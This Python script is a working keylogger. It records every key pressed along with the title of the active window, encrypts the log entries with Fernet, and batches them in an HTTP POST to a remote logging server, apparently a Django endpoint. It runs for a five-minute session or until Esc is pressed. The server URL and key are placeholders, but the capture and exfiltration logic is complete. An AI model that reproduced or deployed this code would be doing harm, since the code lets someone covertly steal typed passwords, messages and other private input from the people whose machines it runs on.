from pynput.keyboard import Listener, Key
import sys
import datetime
import platform # For platform.system()
import os
import time
import requests # For sending HTTP requests
import json     # For formatting data as JSON
import socket   # To get the hostname
from cryptography.fernet import Fernet
import msvcrt   # Keeping for buffer clearing on Windows as in original
import threading # For running listener in a separate thread

# --- Configuration ---
# Check if Windows for pygetwindow
try:
    import pygetwindow as gw
    WINDOWS = platform.system() == "Windows"
except ImportError:
    WINDOWS = False
    print("Warning: pygetwindow not found. Active application tracking may be limited.")

# Django Server Endpoint for logs
LOG_SERVER_URL = "http://ip/local_server_url_goes_here" # Ensure this matches your Django URL

SESSION_DURATION = 300  # 5 minutes in seconds

# Encryption key (Ensure this matches the key in your Django settings.py FERNET_KEY)
KEY = b'YOUR_FERNET_KEY_HERE_PLEASE_REPLACE_ME' # YOUR ACTUAL KEY (ensure it's bytes)

# Initialize Fernet cipher suite
try:
    cipher_suite = Fernet(KEY)
except Exception as e:
    print(f"CRITICAL: Failed to initialize Fernet cipher with the provided key: {e}")
    print("Please ensure the KEY is a valid Fernet key.")
    sys.exit(1) # Exit if key is bad

HOSTNAME = socket.gethostname()

# --- Global Variables for Logging ---
current_typed_sentence = []
pending_encrypted_entries = []
listener_should_stop = threading.Event() # Event to signal the listener thread to stop

# --- Helper Functions ---
def get_active_app():
    if WINDOWS and 'gw' in globals() and gw:
        try:
            active_window = gw.getActiveWindow()
            return active_window.title if active_window else "Unknown App"
        except Exception:
            return "ErrorApp"
    return platform.system()

def encrypt_log_entry(plaintext_entry_string):
    return cipher_suite.encrypt(plaintext_entry_string.encode()).decode()

def add_log_to_batch(log_entry_plaintext):
    global pending_encrypted_entries
    try:
        encrypted_entry = encrypt_log_entry(log_entry_plaintext)
        pending_encrypted_entries.append(encrypted_entry)
    except Exception as e_enc:
        print(f"Error during encryption or adding to batch: {e_enc}")

def send_log_batch_to_server():
    global pending_encrypted_entries
    if not pending_encrypted_entries:
        # print("No logs in batch to send.") # Less verbose
        return True

    log_data_payload_string = "\n".join(pending_encrypted_entries)
    payload = {"hostname": HOSTNAME, "log_data": log_data_payload_string}

    print(f"Sending batch of {len(pending_encrypted_entries)} log entries for {HOSTNAME} to {LOG_SERVER_URL}...")
    try:
        response = requests.post(LOG_SERVER_URL, json=payload, timeout=15)
        response.raise_for_status()
        try:
            response_json = response.json()
            print(f"Log batch sent successfully: {response.status_code} - {response_json}")
        except requests.exceptions.JSONDecodeError:
            print(f"Log batch sent successfully: {response.status_code} - (Non-JSON: {response.text[:100]})")
        pending_encrypted_entries = []
        return True
    except requests.exceptions.HTTPError as e_http:
        print(f"HTTP error sending log: {e_http} (Content: {e_http.response.text[:200]})")
    except requests.exceptions.RequestException as e_req:
        print(f"Request exception sending log: {e_req}")
    except Exception as e_gen:
        print(f"Unexpected error during sending: {e_gen}")
    return False

def finalize_and_log_sentence(sentence_parts_list):
    sentence_text = "".join(sentence_parts_list).strip()
    if sentence_text:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        app_name = get_active_app()
        log_entry_plaintext = f"[{timestamp}] [{app_name}] {sentence_text}"
        add_log_to_batch(log_entry_plaintext)
    return []

# --- Keystroke Listener Callback ---
def on_press(key):
    global current_typed_sentence

    if listener_should_stop.is_set(): # Check if main thread signaled to stop
        return False # Stop the listener

    try:
        if hasattr(key, 'char') and key.char:
            current_typed_sentence.append(key.char)
        elif key == Key.space:
            current_typed_sentence.append(" ")
        elif key == Key.enter:
            current_typed_sentence = finalize_and_log_sentence(current_typed_sentence)
        elif key == Key.backspace:
            if current_typed_sentence:
                current_typed_sentence.pop()
        
        if key == Key.esc:
            print("Escape key pressed. Signaling listener to stop...")
            listener_should_stop.set() # Signal the listener thread to stop
            return False # Stop the listener from this callback

    except Exception as e:
        print(f"Error in on_press: {e}")
    
    return True # Continue listening unless explicitly stopped

# --- Main Execution ---
if __name__ == "__main__":
    print(f"Keylogger started for host: {HOSTNAME}")
    print(f"Sending logs to: {LOG_SERVER_URL}")
    print(f"Session will run for {SESSION_DURATION / 60:.1f} minutes or until Esc is pressed.")
    print("---")

    start_log_message = f"Keylogger session started for {HOSTNAME} at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    add_log_to_batch(start_log_message)
    # Optional: send_log_batch_to_server() # Send startup message immediately

    start_time = time.time()
    
    # Create and start the listener in a separate thread
    listener_thread = None
    listener_instance = Listener(on_press=on_press)

    def listener_target():
        listener_instance.run() # run() is blocking, similar to start() then join()
        # This will be printed when listener_instance.stop() is called or on_press returns False
        print("Listener thread has finished.")

    listener_thread = threading.Thread(target=listener_target, daemon=True) # Daemon so it exits if main thread exits
    listener_thread.start()

    shutdown_reason = "unknown"

    try:
        # Main loop to check for session duration or external stop signals
        while listener_thread.is_alive(): # Loop as long as the listener thread is running
            if listener_should_stop.is_set(): # If Esc key (or other signal) set the event
                shutdown_reason = "Esc key"
                break # Exit the loop, listener will stop because on_press will see the event

            if time.time() - start_time >= SESSION_DURATION:
                print(f"\n{SESSION_DURATION / 60:.1f} minutes up. Signaling listener to stop...")
                listener_should_stop.set() # Signal the listener thread to stop
                shutdown_reason = "session timeout"
                break # Exit the loop

            time.sleep(0.5) # Check periodically

        # Wait for the listener thread to actually finish after being signaled
        # (or if it stopped for other reasons like Esc directly in on_press)
        if listener_instance.is_alive: # Check if it's still alive before join, though run() blocks
            listener_instance.stop() # Ensure it's stopped if loop broke for timeout
        
        listener_thread.join(timeout=5) # Wait a bit for the listener thread to clean up

    except KeyboardInterrupt:
        print("\nKeyboardInterrupt received. Signaling listener to stop...")
        listener_should_stop.set() # Signal listener
        shutdown_reason = "Ctrl+C"
        if listener_instance.is_alive:
             listener_instance.stop()
        if listener_thread and listener_thread.is_alive():
            listener_thread.join(timeout=5)
            
    except Exception as e_main:
        print(f"An error occurred in the main execution block: {e_main}")
        listener_should_stop.set() # Signal listener to stop in case of other errors
        shutdown_reason = f"error: {e_main}"
        if listener_instance.is_alive:
            listener_instance.stop()
        if listener_thread and listener_thread.is_alive():
            listener_thread.join(timeout=5)

    finally:
        print(f"Keylogger stopping due to: {shutdown_reason}.")
        # Finalize and send logs
        if current_typed_sentence: # Log any remaining typed characters
            current_typed_sentence = finalize_and_log_sentence(current_typed_sentence)
        
        if pending_encrypted_entries:
            print("Attempting to send final log batch...")
            send_log_batch_to_server()
        
        if WINDOWS and 'msvcrt' in globals() and msvcrt: # Clear console buffer on Windows
            while msvcrt.kbhit():
                msvcrt.getch()

        print("Keylogger exited.")